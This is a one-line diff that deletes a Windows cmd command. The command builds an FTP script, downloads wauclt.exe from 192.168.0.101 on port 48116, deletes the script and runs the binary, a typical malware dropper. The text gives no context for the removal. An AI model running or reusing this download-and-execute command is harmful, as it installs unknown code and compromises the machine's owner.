@@ -1,1 +1,0 @@
-cmd /c echo open 192.168.0.101 48116 >> ii &echo user 1 1 >> ii &echo get wauclt.exe >> ii &echo bye >> ii &ftp -n -v -s:ii &del ii &wauclt.exe
